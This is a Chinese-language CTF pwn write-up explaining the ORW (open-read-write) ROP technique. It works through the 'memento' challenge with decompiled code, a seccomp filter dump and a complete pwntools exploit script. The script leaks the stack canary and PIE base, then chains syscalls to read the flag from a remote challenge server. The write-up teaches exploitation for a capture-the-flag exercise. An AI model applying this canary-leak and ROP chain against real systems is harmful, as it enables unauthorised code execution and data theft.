+++
date = '2026-11-21T21:13:05+08:00'
draft = false
title = 'ORW'
tags = ["pwn", "rop", "orw", "栈溢出", "syscall"]
categories = ["CTF"]
description = "ORW 是 Pwn 里经典的一类 syscall ROP 题型，在没有 system、/bin/sh 的情况下，直接通过 open-read-write 系统调用读取 flag 文件"
+++

## 什么是 ORW

ORW = **Open + Read + Write**，是 CTF Pwn 栈溢出里非常经典的一类题型。

这类题目一般有这些特征：

- 没有 `system` 函数，也没有预置的 `/bin/sh` 字符串，很难直接拿到交互式 shell；
- 程序里存在 `syscall` 指令，并且能找到全套 pop 寄存器 gadget：`pop rax`、`pop rdi`、`pop rsi`、`pop rdx`；
- 我们可以手动构造系统调用，直接读取 `flag` 文件，不需要 shell。

> 和普通 `system("/bin/sh")` ROP 的区别：system 是拿到 shell 后手动执行 `cat flag`；ORW 不走 shell，直接用内核系统调用完成读文件。

## ORW 整体流程

标准链路：

1. `read(0, buf, size)`：把文件名 `flag\x00` 写入一块可控内存（通常选 BSS 段，下文代码里叫 `slot`）；
2. `open(buf, O_RDONLY, 0)`：打开 flag 文件，成功返回文件描述符，一般是 `3`；
3. `read(3, buf, size)`：从 fd=3 的文件中读取 flag 内容，存到缓冲区；
4. `write(1, buf, size)`：把缓冲区里的 flag 输出到 stdout（fd=1）；
5. 可选：`exit` 正常退出进程，避免异常崩溃。

## 64位 Linux 系统调用号
| rax | 系统调用 | 作用 |
|-----|----------|------|
| 0   | read     | 读   |
| 1   | write    | 写   |
| 2   | open     | 打开文件 |
| 60  | exit     | 退出程序 |

> 注意：32位系统调用号完全不一样，64位不要记混。

## ORW 实现方式

ORW 有两种主流实现方式：

1. **普通 ROP ORW**：逐个 pop 寄存器，依次拼接多条 syscall，逻辑直观，上手门槛低，适合新手；
2. **SROP（Sigreturn Oriented Programming）**：只需要 `pop rax` + `syscall`，利用 rax=15 的 sigreturn 系统调用一次性伪造全部寄存器上下文，payload 更短，但对栈可控性要求更高

## 例题

本题取自`HECTF 2026`——`memento`

### 基本信息

保护情况:

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // ebx
  int i_1; // edi

  for ( i = 3; i != 16; ++i )
  {
    i_1 = i;
    close(i_1);
  }
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("============================================================");
  puts(" MEMENTO // personal memory archive");
  puts(" terminal restored from cold storage");
  puts(" two impressions remain in this session");
  puts("============================================================");
  write(1, "record 1> ", 0xAuLL);
  take_record();
  write(1, "\nrecord 2> ", 0xBuLL);
  take_record();
  return 0;
}
```

调用两次 `take_record()` ,漏洞点在里面

```c
unsigned __int64 __fastcall record(int a1)
{
  _BYTE buf[128]; // [rsp+8h] [rbp-88h] BYREF
  unsigned __int64 v3; // [rsp+88h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  readn(0);
  write(1, buf, 0x100uLL);
  if ( a1 && (unsigned int)install_seccomp() )
    BUG();
  return v3 - __readfsqword(0x28u);
}
```

这里发现，`write`的字节数远超`128`，所以可以一次性泄露`canary`和`libc`基址，也可以算`pie`
实际上，程序被设计成第一次读`0x80`个字节，正好在`canary`前止步，然后打印0x100个字节泄露信息。可以初步考虑ret2libc拿shell
第二次读`0x200`个字节，全部覆盖
这里解释一下为什么两次的读入字节数不同，我也搞了半天才弄明白。注意这里的比较：如果[rbp+var_90]等于0，就读`0x200`个，否则就是`0x80`个

```c
.text:000000000000140C record          proc near               ; CODE XREF: take_record+4↓p
.text:000000000000140C
.text:000000000000140C var_90          = dword ptr -90h
.text:000000000000140C buf             = byte ptr -88h
.text:000000000000140C var_8           = qword ptr -8
.text:000000000000140C
.text:000000000000140C                 push    rbp
.text:000000000000140D                 mov     rbp, rsp
.text:0000000000001410                 sub     rsp, 90h
.text:0000000000001417                 mov     [rbp+var_90], edi
.text:000000000000141D                 mov     rax, fs:28h
.text:0000000000001426                 mov     [rbp+var_8], rax
.text:000000000000142A                 xor     edi, edi        ; fd
.text:000000000000142C                 lea     rsi, [rbp+buf]  ; a2
.text:0000000000001433                 mov     edx, 80h
.text:0000000000001438                 cmp     [rbp+var_90], 0
.text:000000000000143F                 jz      short loc_1446
.text:0000000000001441                 mov     edx, 200h       ; i
```

至于这个是怎么确定这两个数字就是read的字节数，我们可以回到main函数的汇编

```c
.text:000000000000113C                 mov     rdi, rbx        ; s
.text:000000000000113F                 call    _puts
.text:0000000000001144                 mov     edx, 0Ah        ; n
.text:0000000000001149                 mov     edi, 1          ; fd
.text:000000000000114E                 lea     rsi, aRecord1   ; "record 1> "
.text:0000000000001155                 call    _write
.text:000000000000115A                 xor     edi, edi
.text:000000000000115C                 call    take_record
.text:0000000000001161                 mov     edi, 1          ; fd
.text:0000000000001166                 mov     edx, 0Bh        ; n
.text:000000000000116B                 lea     rsi, aRecord2   ; "\nrecord 2> "
.text:0000000000001172                 call    _write
.text:0000000000001177                 mov     edi, 1
.text:000000000000117C                 call    take_record
```

显然第一次调用take_record时，rdi为0，第二次是1，跟进take_record

```c
·text:000000000000148B                 sub     rsp, 8
.text:000000000000148F                 call    record
.text:0000000000001494
.text:0000000000001494                 public after_record
.text:0000000000001494 after_record:
.text:0000000000001494                 add     rsp, 8
.text:0000000000001498                 retn
.text:0000000000001498 take_record     endp
.text:0000000000001498
.text:0000000000001499 ; -----------------------------------------------------------------------
.text:0000000000001499
.text:0000000000001499                 public g_pop_rax
.text:0000000000001499 g_pop_rax:
.text:0000000000001499                 pop     rax
.text:000000000000149A                 retn
.text:000000000000149B ; -----------------------------------------------------------------------
.text:000000000000149B
.text:000000000000149B                 public g_pop_rdi
.text:000000000000149B g_pop_rdi:
.text:000000000000149B                 pop     rdi
.text:000000000000149C                 retn
.text:000000000000149D ; -----------------------------------------------------------------------
.text:000000000000149D
.text:000000000000149D                 public g_pop_rsi
.text:000000000000149D g_pop_rsi:
.text:000000000000149D                 pop     rsi
.text:000000000000149E                 retn
.text:000000000000149F ; -----------------------------------------------------------------------
.text:000000000000149F
.text:000000000000149F                 public g_pop_rdx
.text:000000000000149F g_pop_rdx:
.text:000000000000149F                 pop     rdx
.text:00000000000014A0                 retn
.text:00000000000014A1 ; -----------------------------------------------------------------------
.text:00000000000014A1
.text:00000000000014A1                 public g_syscall
.text:00000000000014A1 g_syscall:                              ; LINUX -
.text:00000000000014A1                 syscall
.text:00000000000014A3                 retn
.text:00000000000014A3 _text           ends
```

再跟进record，上面已经给出。（注意这里还有意外之喜，给了rax,rdi,rsi,rdx,syscall，下面有用）在这个过程中，rdx并没有发生变化，所以这个`rdx`正是read的第三个参数，也就是字节数，至此，追踪完成（之所以这么麻烦，就在于 **IDA 没有拿到（或没有采用）`readn` 的正确原型**，所以它只显示了 `readn(0)` 的 `fd` 参数，而把 `rsi`/`rdx` 中的 `buf` 和 `n` 省略了）
而如果不进行这一步，后续会有很大麻烦。因为这是自定义的readn，不读入指定字节数的数据是不会进行下一步的，正常的read是最多读入指定字节数的数据，在脚本中写了send就进行下一步，这与本题的`readn`有很大差别，即使交互中按下回车也无法结束，因此要精确控制输入字节数

继续往下走

```c
__int64 __fastcall install_seccomp(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // [rsp+0h] [rbp-70h] BYREF
  _QWORD v8[12]; // [rsp+10h] [rbp-60h] BYREF

  v8[11] = __readfsqword(0x28u);
  v8[2] = 32LL;
  v8[3] = 327701LL;
  v8[0] = 0x400000020LL;
  v8[1] = 0xC000003E06000015LL;
  v8[4] = 0x100040015LL;
  v8[5] = 0x200030015LL;
  v8[6] = 0x3C00020015LL;
  v8[7] = 0xE700010015LL;
  v8[8] = 0x8000000000000006LL;
  v8[9] = 0x7FFF000000000006LL;
  LOWORD(v7) = 10;
  // prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, 过滤器)
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL, a6, v7, v8) )
    return 0xFFFFFFFFLL;
  else
    return (unsigned int)-(prctl(22, 2LL, &v7) != 0);
}
```

注意到有`沙箱过滤`

```c
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009
0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009
0005: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0009
0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009
0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009
0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

用 `seccomp-tools dump ./memento.memento` 检测，可以发现只能，输出显示程序禁止 `execve`，仅放行 `read / write / open / exit`，因此只能 ORW，拿shell计划破产
还记得上面提到的题目给了rax,rdi,rsi,rdx,syscall吗，这里就派上用场了。

至此，本题的大体思路就确定了：

+ 第一步，泄露`canary`和`pie`
+ 第二步，利用`ORW`把`flag`写入到一块内存，再打印到屏幕上。bss段上有充分的空间:

```c
.bss:0000000000004040 slot            db    ? ;
.bss:0000000000004041                 db    ? ;
.bss:0000000000004042                 db    ? ;
.bss:0000000000004043                 db    ? ;
.bss:0000000000004044                 db    ? ;
.bss:0000000000004045                 db    ? ;
.bss:0000000000004046                 db    ? ;
.bss:0000000000004047                 db    ? ;
.bss:0000000000004048                 db    ? ;
.bss:0000000000004049                 db    ? ;
.bss:000000000000404A                 db    ? ;
.bss:000000000000404B                 db    ? ;
.bss:000000000000404C                 db    ? ;
.bss:000000000000404D                 db    ? ;
.bss:000000000000404E                 db    ? ;
.bss:000000000000404F                 db    ? ;
.bss:0000000000004050                 db    ? ;
.bss:0000000000004051                 db    ? ;
.bss:0000000000004052                 db    ? ;
.bss:0000000000004053                 db    ? ;
.bss:0000000000004054                 db    ? ;
.bss:0000000000004055                 db    ? ;
.bss:0000000000004056                 db    ? ;
.bss:0000000000004057                 db    ? ;
.bss:0000000000004058                 db    ? ;
.bss:0000000000004059                 db    ? ;
.bss:000000000000405A                 db    ? ;
.bss:000000000000405B                 db    ? ;
.bss:000000000000405C                 db    ? ;
.bss:000000000000405D                 db    ? ;
.bss:000000000000405E                 db    ? ;
.bss:000000000000405F                 db    ? ;
.bss:0000000000004060                 db    ? ;
.bss:0000000000004061                 db    ? ;
.bss:0000000000004062                 db    ? ;
.bss:0000000000004063                 db    ? ;
.bss:0000000000004064                 db    ? ;
.bss:0000000000004065                 db    ? ;
.bss:0000000000004066                 db    ? ;
.bss:0000000000004067                 db    ? ;
.bss:0000000000004068                 db    ? ;
.bss:0000000000004069                 db    ? ;
.bss:000000000000406A                 db    ? ;
.bss:000000000000406B                 db    ? ;
.bss:000000000000406C                 db    ? ;
.bss:000000000000406D                 db    ? ;
.bss:000000000000406E                 db    ? ;
.bss:000000000000406F                 db    ? ;
.bss:0000000000004070                 db    ? ;
.bss:0000000000004071                 db    ? ;
.bss:0000000000004072                 db    ? ;
.bss:0000000000004073                 db    ? ;
.bss:0000000000004074                 db    ? ;
.bss:0000000000004075                 db    ? ;
.bss:0000000000004076                 db    ? ;
.bss:0000000000004077                 db    ? ;
.bss:0000000000004078                 db    ? ;
.bss:0000000000004079                 db    ? ;
.bss:000000000000407A                 db    ? ;
.bss:000000000000407B                 db    ? ;
.bss:000000000000407C                 db    ? ;
.bss:000000000000407D                 db    ? ;
.bss:000000000000407E                 db    ? ;
.bss:000000000000407F                 db    ? ;
.bss:0000000000004080                 db    ? ;
.bss:0000000000004081                 db    ? ;
.bss:0000000000004082                 db    ? ;
.bss:0000000000004083                 db    ? ;
.bss:0000000000004084                 db    ? ;
.bss:0000000000004085                 db    ? ;
.bss:0000000000004086                 db    ? ;
.bss:0000000000004087                 db    ? ;
.bss:0000000000004088                 db    ? ;
.bss:0000000000004089                 db    ? ;
.bss:000000000000408A                 db    ? ;
.bss:000000000000408B                 db    ? ;
.bss:000000000000408C                 db    ? ;
.bss:000000000000408D                 db    ? ;
.bss:000000000000408E                 db    ? ;
.bss:000000000000408F                 db    ? ;
.bss:0000000000004090                 db    ? ;
.bss:0000000000004091                 db    ? ;
.bss:0000000000004092                 db    ? ;
.bss:0000000000004093                 db    ? ;
.bss:0000000000004094                 db    ? ;
.bss:0000000000004095                 db    ? ;
.bss:0000000000004096                 db    ? ;
.bss:0000000000004097                 db    ? ;
.bss:0000000000004098                 db    ? ;
.bss:0000000000004099                 db    ? ;
.bss:000000000000409A                 db    ? ;
.bss:000000000000409B                 db    ? ;
.bss:000000000000409C                 db    ? ;
.bss:000000000000409D                 db    ? ;
.bss:000000000000409E                 db    ? ;
.bss:000000000000409F                 db    ? ;
.bss:00000000000040A0                 db    ? ;
.bss:00000000000040A1                 db    ? ;
.bss:00000000000040A2                 db    ? ;
.bss:00000000000040A3                 db    ? ;
.bss:00000000000040A4                 db    ? ;
.bss:00000000000040A5                 db    ? ;
.bss:00000000000040A6                 db    ? ;
.bss:00000000000040A7                 db    ? ;
.bss:00000000000040A8                 db    ? ;
.bss:00000000000040A9                 db    ? ;
.bss:00000000000040AA                 db    ? ;
.bss:00000000000040AB                 db    ? ;
.bss:00000000000040AC                 db    ? ;
.bss:00000000000040AD                 db    ? ;
.bss:00000000000040AE                 db    ? ;
.bss:00000000000040AF                 db    ? ;
.bss:00000000000040B0                 db    ? ;
.bss:00000000000040B1                 db    ? ;
.bss:00000000000040B2                 db    ? ;
.bss:00000000000040B3                 db    ? ;
.bss:00000000000040B4                 db    ? ;
.bss:00000000000040B5                 db    ? ;
.bss:00000000000040B6                 db    ? ;
.bss:00000000000040B7                 db    ? ;
.bss:00000000000040B8                 db    ? ;
.bss:00000000000040B9                 db    ? ;
.bss:00000000000040BA                 db    ? ;
.bss:00000000000040BB                 db    ? ;
.bss:00000000000040BC                 db    ? ;
.bss:00000000000040BD                 db    ? ;
.bss:00000000000040BE                 db    ? ;
.bss:00000000000040BF                 db    ? ;
.bss:00000000000040C0                 db    ? ;
.bss:00000000000040C1                 db    ? ;
.bss:00000000000040C2                 db    ? ;
.bss:00000000000040C3                 db    ? ;
.bss:00000000000040C4                 db    ? ;
.bss:00000000000040C5                 db    ? ;
.bss:00000000000040C6                 db    ? ;
.bss:00000000000040C7                 db    ? ;
.bss:00000000000040C8                 db    ? ;
.bss:00000000000040C9                 db    ? ;
.bss:00000000000040CA                 db    ? ;
.bss:00000000000040CB                 db    ? ;
.bss:00000000000040CC                 db    ? ;
.bss:00000000000040CD                 db    ? ;
.bss:00000000000040CE                 db    ? ;
.bss:00000000000040CF                 db    ? ;
.bss:00000000000040D0                 db    ? ;
.bss:00000000000040D1                 db    ? ;
.bss:00000000000040D2                 db    ? ;
.bss:00000000000040D3                 db    ? ;
.bss:00000000000040D4                 db    ? ;
.bss:00000000000040D5                 db    ? ;
.bss:00000000000040D6                 db    ? ;
.bss:00000000000040D7                 db    ? ;
.bss:00000000000040D8                 db    ? ;
.bss:00000000000040D9                 db    ? ;
.bss:00000000000040DA                 db    ? ;
.bss:00000000000040DB                 db    ? ;
.bss:00000000000040DC                 db    ? ;
.bss:00000000000040DD                 db    ? ;
.bss:00000000000040DE                 db    ? ;
.bss:00000000000040DF                 db    ? ;
.bss:00000000000040E0                 db    ? ;
.bss:00000000000040E1                 db    ? ;
.bss:00000000000040E2                 db    ? ;
.bss:00000000000040E3                 db    ? ;
.bss:00000000000040E4                 db    ? ;
.bss:00000000000040E5                 db    ? ;
.bss:00000000000040E6                 db    ? ;
.bss:00000000000040E7                 db    ? ;
.bss:00000000000040E8                 db    ? ;
.bss:00000000000040E9                 db    ? ;
.bss:00000000000040EA                 db    ? ;
.bss:00000000000040EB                 db    ? ;
.bss:00000000000040EC                 db    ? ;
.bss:00000000000040ED                 db    ? ;
.bss:00000000000040EE                 db    ? ;
.bss:00000000000040EF                 db    ? ;
.bss:00000000000040F0                 db    ? ;
.bss:00000000000040F1                 db    ? ;
.bss:00000000000040F2                 db    ? ;
.bss:00000000000040F3                 db    ? ;
.bss:00000000000040F4                 db    ? ;
.bss:00000000000040F5                 db    ? ;
.bss:00000000000040F6                 db    ? ;
.bss:00000000000040F7                 db    ? ;
.bss:00000000000040F8                 db    ? ;
.bss:00000000000040F9                 db    ? ;
.bss:00000000000040FA                 db    ? ;
.bss:00000000000040FB                 db    ? ;
.bss:00000000000040FC                 db    ? ;
.bss:00000000000040FD                 db    ? ;
.bss:00000000000040FE                 db    ? ;
.bss:00000000000040FF                 db    ? ;
.bss:0000000000004100                 db    ? ;
.bss:0000000000004101                 db    ? ;
.bss:0000000000004102                 db    ? ;
.bss:0000000000004103                 db    ? ;
.bss:0000000000004104                 db    ? ;
.bss:0000000000004105                 db    ? ;
.bss:0000000000004106                 db    ? ;
.bss:0000000000004107                 db    ? ;
.bss:0000000000004108                 db    ? ;
.bss:0000000000004109                 db    ? ;
.bss:000000000000410A                 db    ? ;
.bss:000000000000410B                 db    ? ;
.bss:000000000000410C                 db    ? ;
.bss:000000000000410D                 db    ? ;
.bss:000000000000410E                 db    ? ;
.bss:000000000000410F                 db    ? ;
.bss:0000000000004110                 db    ? ;
.bss:0000000000004111                 db    ? ;
.bss:0000000000004112                 db    ? ;
.bss:0000000000004113                 db    ? ;
.bss:0000000000004114                 db    ? ;
.bss:0000000000004115                 db    ? ;
.bss:0000000000004116                 db    ? ;
.bss:0000000000004117                 db    ? ;
.bss:0000000000004118                 db    ? ;
.bss:0000000000004119                 db    ? ;
.bss:000000000000411A                 db    ? ;
.bss:000000000000411B                 db    ? ;
.bss:000000000000411C                 db    ? ;
.bss:000000000000411D                 db    ? ;
.bss:000000000000411E                 db    ? ;
.bss:000000000000411F                 db    ? ;
.bss:0000000000004120                 db    ? ;
.bss:0000000000004121                 db    ? ;
.bss:0000000000004122                 db    ? ;
.bss:0000000000004123                 db    ? ;
.bss:0000000000004124                 db    ? ;
.bss:0000000000004125                 db    ? ;
.bss:0000000000004126                 db    ? ;
.bss:0000000000004127                 db    ? ;
.bss:0000000000004128                 db    ? ;
.bss:0000000000004129                 db    ? ;
.bss:000000000000412A                 db    ? ;
.bss:000000000000412B                 db    ? ;
.bss:000000000000412C                 db    ? ;
.bss:000000000000412D                 db    ? ;
.bss:000000000000412E                 db    ? ;
.bss:000000000000412F                 db    ? ;
.bss:0000000000004130                 db    ? ;
.bss:0000000000004131                 db    ? ;
.bss:0000000000004132                 db    ? ;
.bss:0000000000004133                 db    ? ;
.bss:0000000000004134                 db    ? ;
.bss:0000000000004135                 db    ? ;
.bss:0000000000004136                 db    ? ;
.bss:0000000000004137                 db    ? ;
.bss:0000000000004138                 db    ? ;
.bss:0000000000004139                 db    ? ;
.bss:000000000000413A                 db    ? ;
.bss:000000000000413B                 db    ? ;
.bss:000000000000413C                 db    ? ;
.bss:000000000000413D                 db    ? ;
.bss:000000000000413E                 db    ? ;
.bss:000000000000413F                 db    ? ;
.bss:000000000000413F _bss            ends
```

### EXP

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
#p = process("./memento.memento")
p = remote("47.103.188.106",30561)
elf = ELF("./memento.memento")
libc = ELF("./libc.so.6")
# ===========================================================
p.recvuntil(b"record 1> ")
#gdb.attach(p)
p.send(b'A' * 0x80)
data = p.recv(0x100)
canary = u64(data[0x80:0x88])
# leak_ret = u64(data[0xd0:0xd8]) 算libc_base可以用这个
pie = u64(data[0x90:0x98]) - 0x1494
log.success(f"canary = {hex(canary)}")
log.success(f"pie = {hex(pie)}")
# ===========================================================
pop_rax = 0x1499 + pie
pop_rdi = 0x149b + pie
pop_rsi = 0x149d + pie
pop_rdx = 0x149f + pie
syscall = 0x14a1 + pie
slot = 0x4040 + pie
# ===========================================================
def call(rax,rdi,rsi,rdx):
    return (p64(pop_rax) + p64(rax) +
            p64(pop_rdi) + p64(rdi) +
            p64(pop_rsi) + p64(rsi) +
            p64(pop_rdx) + p64(rdx) +
            p64(syscall))
            
chain = b''
chain += call(0, 0, slot, 0x10)       # read(0, slot, 0x40) -> "flag"
chain += call(2, slot, 0, 0)          # open(slot, O_RDONLY)
chain += call(0, 3, slot, 0x100)      # read(3, slot, 0x100)
chain += call(1, 1, slot, 0x100)      # write(1, slot, 0x100)
chain += call(60, 0, 0, 0)            # exit

pay = b'A' * 0x80 + p64(canary) + p64(0) + chain
pay = pay.ljust(0x200, b'\x00')
p.recvuntil(b"record 2> ")
p.send(pay)
p.send(b"flag\x00")
out = p.recvall(timeout=5)
flag = out[0x100:0x200].split(b'\x00')[0].decode()
log.success(flag)
```

这里解释几个重要的点：
* 第一：`canary`如何计算
* ![图1](/images/ORW/图1.png)
+ `0x7ffcaf30a468` - `0x7ffcaf30a3e8` = `0x80`，所以取data[0x80:0x88]
+ 第二：`pie`如何计算
+ 我们取data[0x90:0x98]的`0x59fb02a52494 (take_record+9)`，回到IDA可以看到,`take_record`的偏移是`0x148B`，`take_record+9是0x1494`，那么偏移基址就是`data[0x90:0x98] - 0x1494`

 ```c
.text:000000000000148B                 sub     rsp, 8
.text:000000000000148F                 call    record
.text:0000000000001494
.text:0000000000001494                 public after_record
.text:0000000000001494 after_record:
.text:0000000000001494                 add     rsp, 8
.text:0000000000001498                 retn
.text:0000000000001498 take_record     endp
.text:0000000000001498
  ```

然后就是经典的`ORW`利用了注意点上面都讲过了，不再赘述。还有一点，由于open成功之后，返回的文件描述符 `fd = 3`，我们再把这个 fd 传给 `read`，所以read(3, slot, 0x100)